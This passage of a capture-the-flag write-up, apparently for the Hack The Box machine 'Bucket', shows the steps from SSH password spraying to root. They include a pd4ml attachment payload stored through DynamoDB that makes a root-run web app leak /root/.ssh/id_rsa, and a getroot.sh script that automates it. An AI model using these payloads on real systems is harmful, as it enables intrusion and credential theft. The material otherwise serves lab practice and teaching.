    <span style=color:#e6db74>&#34;ScannedCount&#34;</span>: 3,
    <span style=color:#e6db74>&#34;ConsumedCapacity&#34;</span>: null
<span style=color:#f92672>}</span>
</code></pre></div><p>I&rsquo;ll keep those credentials.</p><h4 id=ssh-access>SSH Access<a hidden class=anchor aria-hidden=true href=#ssh-access>#</a></h4><p>Password <code>n2vM-&lt;_K_Q:.Aa2</code> works on <code>roy</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ crackmapexec ssh <span style=color:#e6db74>&#39;10.10.10.212&#39;</span> -u roy -p passwords.list
SSH         10.10.10.212    <span style=color:#ae81ff>22</span>     10.10.10.212     <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
SSH         10.10.10.212    <span style=color:#ae81ff>22</span>     10.10.10.212     <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> roy:Management@#1@# Authentication failed.
SSH         10.10.10.212    <span style=color:#ae81ff>22</span>     10.10.10.212     <span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> roy:Welcome123! Authentication failed.
SSH         10.10.10.212    <span style=color:#ae81ff>22</span>     10.10.10.212     <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> roy:n2vM-&lt;_K_Q:.Aa2 
</code></pre></div><p>Now I can login into the system using <code>roy</code> credentials.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>→ root@iamf «bucket» «10.10.14.39» 
$ ssh roy@10.10.10.212
roy@10.10.10.212&#39;s password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

...&lt;SNIP&gt;...
  System load:                      0.02
  Usage of /:                       33.8% of 17.59GB
  Memory usage:                     29%
  Swap usage:                       0%
  Processes:                        252
  Users logged in:                  0
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48

...&lt;SNIP&gt;...
roy@bucket:~$ id
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
roy@bucket:~$ 
</code></pre></div><p>The user flag is done here.</p><p><img class=img-container src=imgs/image-20210423013951765.png alt=image-20210423013951765></p><h3 id=shell-as-root>Shell as root<a hidden class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=enumeration-2>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration-2>#</a></h4><p>Running WinPEAS discovers another service currently running on port 8000.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                     
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:46275         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
</code></pre></div><p>It also discovers that <code>bucket-app</code> in <code>/var/www/</code> is belong to the root user and readable to user <code>roy</code> but not to others.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>[+] Readable files belonging to root and readable by me but not world readable
-rwxr-x---+ 1 root root 808729 Jun 10  2020 /var/www/bucket-app/pd4ml_demo.jar                                 
-rw-r-x---+ 1 root root 358 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/README.md
-rw-r-x---+ 1 root root 1085 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE
-rw-r-x---+ 1 root root 4689 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php
-rw-r-x---+ 1 root root 4746 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php
</code></pre></div><p>I can list the contents inside <code>bucket-app</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>roy@bucket:/var/www/bucket-app$ ls -la
total <span style=color:#ae81ff>856</span>
drwxr-x---+  <span style=color:#ae81ff>4</span> root root   <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>10</span> 12:29 .
drwxr-xr-x   <span style=color:#ae81ff>4</span> root root   <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>10</span> 12:29 ..
-rw-r-x---+  <span style=color:#ae81ff>1</span> root root     <span style=color:#ae81ff>63</span> Sep <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2020</span> composer.json
-rw-r-x---+  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>20533</span> Sep <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2020</span> composer.lock
drwxr-x---+  <span style=color:#ae81ff>2</span> root root   <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>22</span> 12:38 files
-rwxr-x---+  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>17222</span> Sep <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2020</span> index.php
-rwxr-x---+  <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>808729</span> Jun <span style=color:#ae81ff>10</span>  <span style=color:#ae81ff>2020</span> pd4ml_demo.jar
drwxr-x---+ <span style=color:#ae81ff>10</span> root root   <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>10</span> 12:29 vendor
</code></pre></div><p>According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml>roy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf 

<span style=color:#f92672>&lt;VirtualHost</span> <span style=color:#960050;background-color:#1e0010>127.0.0.1:8000</span><span style=color:#f92672>&gt;</span> # unknown
        <span style=color:#f92672>&lt;IfModule</span> <span style=color:#960050;background-color:#1e0010>mpm_itk_module</span><span style=color:#f92672>&gt;</span>
                AssignUserId root root
        <span style=color:#f92672>&lt;/IfModule&gt;</span>
        DocumentRoot /var/www/bucket-app
<span style=color:#f92672>&lt;/VirtualHost&gt;</span>

<span style=color:#f92672>&lt;VirtualHost</span> <span style=color:#960050;background-color:#1e0010>*:80</span><span style=color:#f92672>&gt;</span> # bucket.htb
        DocumentRoot /var/www/html
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^bucket.htb$
        RewriteRule /.* http://bucket.htb/ [R]
<span style=color:#f92672>&lt;/VirtualHost&gt;</span>
<span style=color:#f92672>&lt;VirtualHost</span> <span style=color:#960050;background-color:#1e0010>*:80</span><span style=color:#f92672>&gt;</span> # s3.bucket.htb 

        ProxyPreserveHost on
        ProxyPass / http://localhost:4566/
        ProxyPassReverse / http://localhost:4566/
        <span style=color:#f92672>&lt;Proxy</span> <span style=color:#960050;background-color:#1e0010>*</span><span style=color:#f92672>&gt;</span>
                 Order deny,allow
                 Allow from all
         <span style=color:#f92672>&lt;/Proxy&gt;</span>
        ServerAdmin webmaster@localhost
        ServerName s3.bucket.htb

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

<span style=color:#f92672>&lt;/VirtualHost&gt;</span>
</code></pre></div><h4 id=internal-web>Internal Web<a hidden class=anchor aria-hidden=true href=#internal-web>#</a></h4><p>I&rsquo;ll expose the internal web to my localhost on the same port using SSH local port forwarding.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>roy@bucket:/var/www/bucket-app$ ~C
ssh&gt; -L 8000:127.0.0.1:8000
Forwarding port.
roy@bucket:/var/www/bucket-app$
</code></pre></div><p>The website page says the site is under construction.</p><p><img class=img-container src=imgs/image-20210423015905604.png alt=image-20210423015905604></p><h4 id=source-code-review>Source Code Review<a hidden class=anchor aria-hidden=true href=#source-code-review>#</a></h4><p>Upon reviewing the <code>index.php</code>, I found out that this website can be abused.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>roy@bucket:/var/www/bucket-app$ cat index.php 

&lt;?php
require <span style=color:#e6db74>&#39;vendor/autoload.php&#39;</span>;
use Aws<span style=color:#ae81ff>\D</span>ynamoDb<span style=color:#ae81ff>\D</span>ynamoDbClient;
<span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$_SERVER<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;REQUEST_METHOD&#34;</span><span style=color:#f92672>]===</span><span style=color:#e6db74>&#34;POST&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
        <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;action&#34;</span><span style=color:#f92672>]===</span><span style=color:#e6db74>&#34;get_alerts&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span> <span style=color:#75715e># POST action=get_alerts </span>
                date_default_timezone_set<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;America/New_York&#39;</span><span style=color:#f92672>)</span>;
                $client <span style=color:#f92672>=</span> new DynamoDbClient<span style=color:#f92672>([</span>  <span style=color:#75715e># Connect to DynamoDB.</span>
                        <span style=color:#e6db74>&#39;profile&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;default&#39;</span>,
                        <span style=color:#e6db74>&#39;region&#39;</span>  <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;us-east-1&#39;</span>,
                        <span style=color:#e6db74>&#39;version&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;latest&#39;</span>,
                        <span style=color:#e6db74>&#39;endpoint&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;http://localhost:4566&#39;</span>
                <span style=color:#f92672>])</span>;
                
                $iterator <span style=color:#f92672>=</span> $client-&gt;getIterator<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;Scan&#39;</span>, array<span style=color:#f92672>(</span> <span style=color:#75715e># Read content from table alerts</span>
                        <span style=color:#e6db74>&#39;TableName&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#39;alerts&#39;</span>,
                        <span style=color:#e6db74>&#39;FilterExpression&#39;</span> <span style=color:#f92672>=</span>&gt; <span style=color:#e6db74>&#34;title = :title&#34;</span>, <span style=color:#75715e># Filter by title</span>
                        <span style=color:#e6db74>&#39;ExpressionAttributeValues&#39;</span> <span style=color:#f92672>=</span>&gt; array<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;:title&#34;</span><span style=color:#f92672>=</span>&gt;array<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;S&#34;</span><span style=color:#f92672>=</span>&gt;<span style=color:#e6db74>&#34;Ransomware&#34;</span><span style=color:#f92672>))</span>,
                <span style=color:#f92672>))</span>;

                foreach <span style=color:#f92672>(</span>$iterator as $item<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>  <span style=color:#75715e># </span>
                        $name<span style=color:#f92672>=</span>rand<span style=color:#f92672>(</span>1,10000<span style=color:#f92672>)</span>.<span style=color:#e6db74>&#39;.html&#39;</span>; <span style=color:#75715e># Generate randomnumber.html </span>
                        file_put_contents<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;files/&#39;</span>.$name,$item<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;data&#34;</span><span style=color:#f92672>])</span>; <span style=color:#75715e># Write contents to randomnumber.html</span>
                <span style=color:#f92672>}</span>
                passthru<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span>$name<span style=color:#e6db74> 800 A4 -out files/result.pdf&#34;</span><span style=color:#f92672>)</span>; <span style=color:#75715e># convert randomnumber.html to result.pdf</span>
        <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
<span style=color:#66d9ef>else</span>
<span style=color:#f92672>{</span>
?&gt;
...&lt;SNIP&gt;...
</code></pre></div><p>Let&rsquo;s break it down.</p><p>When there is a POST request contains data of <code>action=get_alerts</code>, the site will create a connection to DynamoDB.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>if</span>($_SERVER[<span style=color:#e6db74>&#34;REQUEST_METHOD&#34;</span>]<span style=color:#f92672>===</span><span style=color:#e6db74>&#34;POST&#34;</span>) {
        <span style=color:#66d9ef>if</span>($_POST[<span style=color:#e6db74>&#34;action&#34;</span>]<span style=color:#f92672>===</span><span style=color:#e6db74>&#34;get_alerts&#34;</span>) { <span style=color:#75715e># POST action=get_alerts 
</span><span style=color:#75715e></span>                <span style=color:#a6e22e>date_default_timezone_set</span>(<span style=color:#e6db74>&#39;America/New_York&#39;</span>);
                $client <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DynamoDbClient</span>([  <span style=color:#75715e># Connect to DynamoDB.
</span><span style=color:#75715e></span>                        <span style=color:#e6db74>&#39;profile&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;default&#39;</span>,
                        <span style=color:#e6db74>&#39;region&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;us-east-1&#39;</span>,
                        <span style=color:#e6db74>&#39;version&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;latest&#39;</span>,
                        <span style=color:#e6db74>&#39;endpoint&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;http://localhost:4566&#39;</span>
                ]);
</code></pre></div><p>It then reads every item in table <code>alerts</code> and filters out the result only to the one that contains string value of “Ransomware” (the key).</p><blockquote><p>DynamoDB is key-value NoSQL database.</p></blockquote><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>$iterator <span style=color:#f92672>=</span> $client<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>getIterator</span>(<span style=color:#e6db74>&#39;Scan&#39;</span>, <span style=color:#66d9ef>array</span>( <span style=color:#75715e># Read content from table alerts
</span><span style=color:#75715e></span>       <span style=color:#e6db74>&#39;TableName&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;alerts&#39;</span>,
       <span style=color:#e6db74>&#39;FilterExpression&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#34;title = :title&#34;</span>, <span style=color:#75715e># Filter by title
</span><span style=color:#75715e></span>       <span style=color:#e6db74>&#39;ExpressionAttributeValues&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;:title&#34;</span><span style=color:#f92672>=&gt;</span><span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;S&#34;</span><span style=color:#f92672>=&gt;</span><span style=color:#e6db74>&#34;Ransomware&#34;</span>)),
));
</code></pre></div><p>For each result, it writes the result value ($item[“data”]) of &ldquo;Ransomware&rdquo; to a randomly named HTML file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>foreach</span> ($iterator <span style=color:#66d9ef>as</span> $item) {  <span style=color:#75715e># 
</span><span style=color:#75715e></span>        $name<span style=color:#f92672>=</span><span style=color:#a6e22e>rand</span>(<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>10000</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;.html&#39;</span>; <span style=color:#75715e># Generate randomnumber.html 
</span><span style=color:#75715e></span>        <span style=color:#a6e22e>file_put_contents</span>(<span style=color:#e6db74>&#39;files/&#39;</span><span style=color:#f92672>.</span>$name,$item[<span style=color:#e6db74>&#34;data&#34;</span>]); <span style=color:#75715e># Write contents to randomnumber.html
</span><span style=color:#75715e></span>}
</code></pre></div><p>The HTML file then gets converted into a PDF file (<code>result.pdf</code>) using <code>pd4ml</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#a6e22e>passthru</span>(<span style=color:#e6db74>&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span style=color:#e6db74>$name</span><span style=color:#e6db74> 800 A4 -out files/result.pdf&#34;</span>); <span style=color:#75715e># convert randomnumber.html to result.pdf
</span></code></pre></div><p>From the enumeration above on the DynamoDB, I know there is no table called <code>alerts</code>.</p><p>The idea is, if I have a control over the <code>alerts</code> table as well as the write and read operations on the table, then I can abuse this web application to read almost any file on the system* (arbitrary file read)</p><blockquote><p>*The web application is currently running as root</p></blockquote><h4 id=obtain-root-ssh-key>Obtain root SSH Key<a hidden class=anchor aria-hidden=true href=#obtain-root-ssh-key>#</a></h4><p>First I’ll try to create a dummy table on the database. I’ll use JSON file to create it.</p><p><code>test-table.json</code>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
	<span style=color:#f92672>&#34;TableName&#34;</span>: <span style=color:#e6db74>&#34;iamf&#34;</span>,
	<span style=color:#f92672>&#34;AttributeDefinitions&#34;</span>: 
	[
		{ <span style=color:#f92672>&#34;AttributeName&#34;</span>: <span style=color:#e6db74>&#34;Name&#34;</span>, <span style=color:#f92672>&#34;AttributeType&#34;</span> : <span style=color:#e6db74>&#34;S&#34;</span> }
	],
	<span style=color:#f92672>&#34;KeySchema&#34;</span>: 
	[ 
		{ <span style=color:#f92672>&#34;AttributeName&#34;</span>: <span style=color:#e6db74>&#34;Name&#34;</span>, <span style=color:#f92672>&#34;KeyType&#34;</span> : <span style=color:#e6db74>&#34;HASH&#34;</span> }
	],
	<span style=color:#f92672>&#34;ProvisionedThroughput&#34;</span> : 
		{ <span style=color:#f92672>&#34;WriteCapacityUnits&#34;</span>: <span style=color:#ae81ff>5</span>, <span style=color:#f92672>&#34;ReadCapacityUnits&#34;</span>: <span style=color:#ae81ff>10</span> }
}
</code></pre></div><p>Now I can use the subcommand <code>create-table</code> with <code>--cli-input-json</code> option and specify the JSON file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb create-table --cli-input-json file://test-table.json --endpoint-url  http://s3.bucket.htb

<span style=color:#f92672>{</span>
    <span style=color:#e6db74>&#34;TableDescription&#34;</span>: <span style=color:#f92672>{</span>
        <span style=color:#e6db74>&#34;AttributeDefinitions&#34;</span>: <span style=color:#f92672>[</span>
            <span style=color:#f92672>{</span>
                <span style=color:#e6db74>&#34;AttributeName&#34;</span>: <span style=color:#e6db74>&#34;Name&#34;</span>,
                <span style=color:#e6db74>&#34;AttributeType&#34;</span>: <span style=color:#e6db74>&#34;S&#34;</span>
            <span style=color:#f92672>}</span>
        <span style=color:#f92672>]</span>,
        <span style=color:#e6db74>&#34;TableName&#34;</span>: <span style=color:#e6db74>&#34;iamf&#34;</span>,
        <span style=color:#e6db74>&#34;KeySchema&#34;</span>: <span style=color:#f92672>[</span>
            <span style=color:#f92672>{</span>
                <span style=color:#e6db74>&#34;AttributeName&#34;</span>: <span style=color:#e6db74>&#34;Name&#34;</span>,
                <span style=color:#e6db74>&#34;KeyType&#34;</span>: <span style=color:#e6db74>&#34;HASH&#34;</span>
            <span style=color:#f92672>}</span>
        <span style=color:#f92672>]</span>,
        <span style=color:#e6db74>&#34;TableStatus&#34;</span>: <span style=color:#e6db74>&#34;ACTIVE&#34;</span>,
        <span style=color:#e6db74>&#34;CreationDateTime&#34;</span>: <span style=color:#e6db74>&#34;2021-04-22T15:22:33.634000-04:00&#34;</span>,
...&lt;SNIP&gt;...
</code></pre></div><p>I can confirm the table has been created using the subcommand <code>list-tables</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb

<span style=color:#f92672>{</span>
    <span style=color:#e6db74>&#34;TableNames&#34;</span>: <span style=color:#f92672>[</span>
        <span style=color:#e6db74>&#34;iamf&#34;</span>,
        <span style=color:#e6db74>&#34;users&#34;</span>
    <span style=color:#f92672>]</span>
<span style=color:#f92672>}</span>
</code></pre></div><blockquote><p>I can also insert items to the table, but I&rsquo;ll skip it here. Detailed notes are available on my GitHub.</p></blockquote><p>Knowing this, now I can create the <code>alerts</code> table. I’ll write it on JSON format as well.</p><p><code>alert-table.json</code>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
        <span style=color:#f92672>&#34;TableName&#34;</span>: <span style=color:#e6db74>&#34;alerts&#34;</span>,
        <span style=color:#f92672>&#34;AttributeDefinitions&#34;</span>:
        [
                {<span style=color:#f92672>&#34;AttributeName&#34;</span>: <span style=color:#e6db74>&#34;title&#34;</span>, <span style=color:#f92672>&#34;AttributeType&#34;</span> : <span style=color:#e6db74>&#34;S&#34;</span>},
                {<span style=color:#f92672>&#34;AttributeName&#34;</span>: <span style=color:#e6db74>&#34;data&#34;</span>, <span style=color:#f92672>&#34;AttributeType&#34;</span> : <span style=color:#e6db74>&#34;S&#34;</span>}
        ],
        <span style=color:#f92672>&#34;KeySchema&#34;</span>:
        [
                {<span style=color:#f92672>&#34;AttributeName&#34;</span>: <span style=color:#e6db74>&#34;title&#34;</span>, <span style=color:#f92672>&#34;KeyType&#34;</span> : <span style=color:#e6db74>&#34;HASH&#34;</span>},
                {<span style=color:#f92672>&#34;AttributeName&#34;</span>: <span style=color:#e6db74>&#34;data&#34;</span>, <span style=color:#f92672>&#34;KeyType&#34;</span> : <span style=color:#e6db74>&#34;RANGE&#34;</span>}
        ],
        <span style=color:#f92672>&#34;ProvisionedThroughput&#34;</span> :
        {<span style=color:#f92672>&#34;WriteCapacityUnits&#34;</span>: <span style=color:#ae81ff>5</span>, <span style=color:#f92672>&#34;ReadCapacityUnits&#34;</span>: <span style=color:#ae81ff>10</span>}
}
</code></pre></div><p>Now to abuse the application for file read, I’ll put the root SSH key path within <code>&lt;pd4ml:attachment></code> tags. The tags can be used to embed a file [<a href=https://pd4ml.com/html.htm>source</a>]. I&rsquo;ll write it on JSON format and name it as <code>payload.json</code></p><p><code>payload.json</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
	<span style=color:#f92672>&#34;title&#34;</span>: { <span style=color:#f92672>&#34;S&#34;</span>: <span style=color:#e6db74>&#34;Ransomware&#34;</span> }, 
    <span style=color:#f92672>&#34;data&#34;</span>: { <span style=color:#f92672>&#34;S&#34;</span>: <span style=color:#e6db74>&#34;&lt;pd4ml:attachment&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;&#34;</span> }
}
</code></pre></div><p>And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as <code>getroot.sh</code>.</p><p><code>getroot.sh</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>
echo <span style=color:#e6db74>&#34;[+] Create table&#34;</span>
aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url<span style=color:#f92672>=</span>http://s3.bucket.htb &gt;/dev/null
sleep 0.5
echo <span style=color:#e6db74>&#34;[+] Insert item&#34;</span>
aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url<span style=color:#f92672>=</span>http://s3.bucket.htb &gt;/dev/null
sleep 0.5
echo <span style=color:#e6db74>&#34;[+] Send get alerts&#34;</span>
curl -svd <span style=color:#e6db74>&#34;action=get_alerts&#34;</span> http://127.0.0.1:8000/ <span style=color:#75715e># The port 8000 on Bucket forwarded to localhost:8000</span>
</code></pre></div><blockquote><p>The script assume all the required files are stored in the same folder.</p></blockquote><p>I’ll watch the result.pdf at <code>/var/www/bucket/files</code> and grab the SSH key using <code>roy</code>’s session.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>roy@bucket:/var/www/bucket-app/files$ <span style=color:#66d9ef>while</span> sleep 2; <span style=color:#66d9ef>do</span> sed -n <span style=color:#e6db74>&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null; <span style=color:#66d9ef>done</span>
</code></pre></div><p>Now I can just execute the <code>getroot.sh</code> script and wait for it to complete.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ ./getroot.sh  

<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Create table
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Insert item
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Send get alerts
*   Trying 127.0.0.1:8000...
* TCP_NODELAY set
* Connected to 127.0.0.1 <span style=color:#f92672>(</span>127.0.0.1<span style=color:#f92672>)</span> port <span style=color:#ae81ff>8000</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
&gt; POST / HTTP/1.1
&gt; Host: 127.0.0.1:8000
&gt; User-Agent: curl/7.66.0
&gt; Accept: */*
&gt; Content-Length: <span style=color:#ae81ff>17</span>
&gt; Content-Type: application/x-www-form-urlencoded
&gt; 
* upload completely sent off: <span style=color:#ae81ff>17</span> out of <span style=color:#ae81ff>17</span> bytes
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 <span style=color:#ae81ff>200</span> OK
&lt; Date: Thu, <span style=color:#ae81ff>22</span> Apr <span style=color:#ae81ff>2021</span> 20:04:14 GMT
&lt; Server: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
&lt; Content-Length: <span style=color:#ae81ff>0</span>
&lt; Content-Type: text/html; charset<span style=color:#f92672>=</span>UTF-8
&lt; 
* Connection <span style=color:#75715e>#0 to host 127.0.0.1 left intact</span>
</code></pre></div><p>On <code>roy</code> shell, I can see it captured the ssh key.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>roy@bucket:/var/www/bucket-app/files$ <span style=color:#66d9ef>while</span> sleep 1; <span style=color:#66d9ef>do</span> sed -n <span style=color:#e6db74>&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null; <span style=color:#66d9ef>done</span>

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...&lt;SNIP&gt;...
-----END OPENSSH PRIVATE KEY-----
</code></pre></div><p>The full process as shown below:</p><p><img class=img-container src=imgs/image-20210425032310617.png alt=image-20210425032310617></p><p>I’ll save that key as <code>root_rsa</code> and change its permission to 600.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@iamf «bucket» «10.10.14.39» 
$ chmod <span style=color:#ae81ff>600</span> root_rsa
</code></pre></div><p>After that, I can just login as root user using the SSH key I obtained.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>→ root@iamf «bucket» «10.10.14.39» 
$ ssh -i root_rsa 10.10.10.212
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

...&lt;SNIP&gt;...
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48

...&lt;SNIP&gt;...
root@bucket:~# id;hostname;cut -c-15 root.txt 
uid=0(root) gid=0(root) groups=0(root)
bucket
efc73dd09ceb705
